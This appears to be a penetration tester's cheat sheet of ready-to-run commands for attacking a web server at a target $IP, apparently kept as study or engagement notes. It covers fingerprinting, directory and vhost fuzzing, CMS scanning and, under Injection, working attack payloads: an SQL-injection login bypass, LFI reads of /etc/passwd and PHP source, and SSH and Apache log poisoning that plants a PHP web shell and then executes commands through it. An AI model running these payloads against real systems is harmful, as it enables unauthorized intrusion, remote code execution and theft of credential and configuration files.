# Fingerprinting
## Enumerate with nmap scripts
```bash
nmap --script=http-enum,http-headers,http-methods,http-robots.txt,http-title -p 80,443 $IP
```

## Scan with nikto
```bash
nikto -h http://$IP -o nikto_results.txt
```

## Identify web stack
```bash
whatweb http://$IP
```

# Content Discovery
## Check robots.txt
```bash
curl http://$IP/robots.txt
```

## Check sitemap.xml
```bash
curl http://$IP/sitemap.xml
```

## Check for exposed git
```bash
curl http://$IP/.git/config
```

## Check web.config
```bash
curl http://$IP/web.config
```

## Enumerate directories
raft-large-directories.txt OR common.txt for faster scan.
Also test directories that could be specific to that machine, like /hostname.
```bash
ffuf -u http://$IP/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -fc 404 -t 50
```

## Enumerate files with extensions
```bash
ffuf -u http://$IP/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -e .php,.html,.txt,.bak -fc 404 -t 50
```

## Fuzz vhosts
```bash
ffuf -u http://$IP -H "Host: FUZZ.domain.com" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <size>
```

## Search page source
```bash
curl http://$IP | grep -i -E "(password|user|admin|login|sql|database|config)"
```

# Injection
## Test SQLi in login
```bash
curl -X POST http://$IP/login.php -d "username=admin' OR '1'='1'--&password=test"
```

## Read file via LFI
```bash
# Linux: ../../../etc/passwd OR Windows: ../../../windows/system32/drivers/etc/hosts
curl http://$IP/page.php?file=../../../etc/passwd
```

## Read PHP source with filter
```bash
curl http://$IP/page.php?file=php://filter/convert.base64-encode/resource=config.php
```

## Poison SSH log
```bash
ssh '<?php system($_GET["cmd"]); ?>'@$IP
```

## Execute via poisoned SSH log
```bash
curl http://$IP/page.php?file=../../../var/log/auth.log&cmd=whoami
```

## Poison Apache log
```bash
curl -A '<?php system($_GET["cmd"]); ?>' http://$IP/
```

## Execute via poisoned Apache log
```bash
curl http://$IP/page.php?file=../../../var/log/apache2/access.log&cmd=whoami
```

# CMS Scanning
## Scan WordPress
```bash
wpscan --url http://$IP --enumerate ap,at,u
```

## Scan Joomla
```bash
joomscan -u http://$IP
```

## Scan Drupal
```bash
droopescan scan drupal -u http://$IP
```

## URL encode parameters
```bash
# POST: --data-urlencode OR GET: add -G flag to beginning
curl -G http://$IP --data-urlencode "cmd=whoami"
```

---

# Reference

For detailed methodology, LFI/RCE techniques, file upload bypasses, and CMS-specific enumeration, see [[HTTP Reference]]

**Quick enumeration workflow:**
1. Run automated scans (nmap scripts, nikto, whatweb)
2. Check common files (robots.txt, sitemap.xml, .git/config)
3. Directory enumeration with ffuf (raft-large or common.txt)
4. **Review autorecon feroxbuster output line-by-line** (don't skim!)
5. CMS scanning if detected (wpscan, joomscan, droopescan)
6. Test for SQLi, LFI, file upload, command injection
